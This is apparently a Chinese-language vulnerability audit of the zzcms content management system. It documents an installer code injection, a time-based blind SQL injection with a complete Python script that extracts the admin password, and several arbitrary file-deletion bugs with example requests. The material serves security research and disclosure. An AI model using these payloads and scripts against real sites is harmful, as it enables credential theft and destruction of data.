---
title: zzcms
tags: 
 - 代码审计
grammar_cjkRuby: true
---


# 0x01 install

![][1]

这里的参数会在`/inc/config.php`中储存,这样的话我如果构造相应的语句，闭合括号，这样的话就能成功的执行sql注入，由于waf的原因，控制**siteurl**随便写
写入`siteurl=1');phpinfo();#`

发现是可以执行的，但是由于之前需要验证数据库信息，所以这个利用的前提是install目录没有被删掉，而且要猜测数据库用户名密码

## poc

![][2]

**str**参数结果：

![][3]

最后执行成功

![][4]

# 0x02 /user/adv2.php

首先定位到漏洞点

![][5]

然后看一下漏洞的逻辑，首先慢慢向上回溯，发现需要进入这里首先需要让`a`、`c`不全为0

![][6]
  
 也就是说让`zzcms_main`或`zzcms_zh`中有值,直接添加会告知用户没有权限，这样的话直接改包
 
 ![][7]
 
 
 然后继续回溯，发现需要让`action=modify`
 
 ![][8]
 
 至此就可以，首先先调试一下，直接在phpstorm中调试`id=0 or if((select ascii(substr(pass,1,1)) from zzcms_admin)=50,sleep(5),0)`,发现果然有延迟，写脚本即可
 
 ## poc
 
 ```
 import requests
import string

s = requests.session()
url = "http://127.0.0.1:8080/user/adv2.php?action=modify"

cookies = {
 'UserName':'test2'
}

flag = ''

for i in range(1,40):
  for j in range(33,125):
    data = {
      'id':'0 or if((select ascii(substr(pass,{},1)) from zzcms_admin)={},sleep(3),0)'.format(i,j)
    }
    #print data
    r = s.post(url,data=data,cookies=cookies)
    #print r.text
    sec=r.elapsed.seconds
    #print i,j,sec
    if sec >2:
      flag += chr(j)
      print flag
      break

print flag
```

密码到手

![][9]


# 0x03 user/licence_save.php 

首先找到漏洞点

![][10]

发现存在任意执行删除任意文件的操作，通过代码可以得知我们只要控制`oldimg`即可，首先创建`test.php`

![][11]

然后执行操作，切记一定满足`$oldimg<>$img && $oldimg<>"/image/nopic.gif"`

![][12]

然后执行

![][13]

可以发现文件已经删除了

![][14]

## poc

```
GET:
http://127.0.0.1:8080/user/licence_save.php?action=modify

POST:
id=11&oldimg=test.php&img=1231
```

# 0x04   /user/manage.php

任意删除文件漏洞，首先分析一下代码，条件首先是`action=modify`

![][15]

为了满足条件，必须让`founderr==1`这个判断失败，也就是说必须让`content`不为空

![][16]

这样的话，直接控制`oldimg`或是`oldflv `中数据  POST数值就可以实现

## poc

![][17]

# 0x05 /user/ppsave.php

任意删除文件漏洞，首先分析一下代码，条件首先是`action=modify`

![][18]

这个没有其他先前条件，直接控制`oldimg`即可

## poc

![][19]








 
 


  [1]: ./images/4.png "4"
  [2]: ./images/2.png "2"
  [3]: ./images/1.png "1"
  [4]: ./images/5.png "5"
  [5]: ./images/6.png "6"
  [6]: ./images/7.png "7"
  [7]: ./images/9.png "9"
  [8]: ./images/8.png "8"
  [9]: ./images/10.png "10"
  [10]: ./images/13.png "13"
  [11]: ./images/12.png "12"
  [12]: ./images/15.png "15"
  [13]: ./images/16.png "16"
  [14]: ./images/17.png "17"
  [15]: ./images/19.png "19"
  [16]: ./images/20.png "20"
  [17]: ./images/21_1.png "21"
  [18]: ./images/24.png "24"
  [19]: ./images/25.png "25"